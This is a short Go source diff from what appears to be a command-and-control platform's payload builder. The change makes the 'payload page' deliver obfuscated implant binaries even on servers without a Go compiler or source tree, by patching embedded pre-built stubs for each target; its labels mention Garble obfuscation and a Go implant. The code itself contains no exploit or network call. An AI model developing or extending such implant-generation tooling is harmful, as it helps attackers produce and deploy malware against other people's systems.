@@ -7,6 +7,8 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+
+	"c2-platform/implant/templates"
 )
 
 func goBin() (string, error) {
@@ -33,11 +35,13 @@ func targetGOOSArch(target string) (string, string, error) {
 func buildGo(ctx context.Context, req Request) (*Result, error) {
 	gb, err := goBin()
 	if err != nil {
-		return nil, fmt.Errorf("%w: go toolchain", ErrNoCompiler)
+		return templateFallback(req, "内嵌模板（无 Go 工具链）")
 	}
+	// A deployed server has the binary but not the source tree, so compiling
+	// ./cmd/implant is impossible there. The embedded stub covers it.
 	root, err := moduleRoot()
 	if err != nil {
-		return nil, err
+		return templateFallback(req, "内嵌模板（无源码树）")
 	}
 	goos, arch, err := targetGOOSArch(req.Target)
 	if err != nil {
@@ -91,6 +95,17 @@ func buildGo(ctx context.Context, req Request) (*Result, error) {
 		tech = append(tech, "Garble 混淆")
 	}
 	return finishBinary(req, raw, tech)
+}
+
+// templateFallback patches the embedded stub for the requested target. It is
+// the same binary the compiler would produce, built at release time, so the
+// payload page works on a host with neither Go nor the module source.
+func templateFallback(req Request, reason string) (*Result, error) {
+	raw := templates.Lookup(req.Target)
+	if len(raw) == 0 {
+		return nil, fmt.Errorf("%w: go toolchain", ErrNoCompiler)
+	}
+	return finishBinary(req, raw, []string{"Go 植入端", reason, "二进制补丁"})
 }
 
 func moduleRoot() (string, error) {
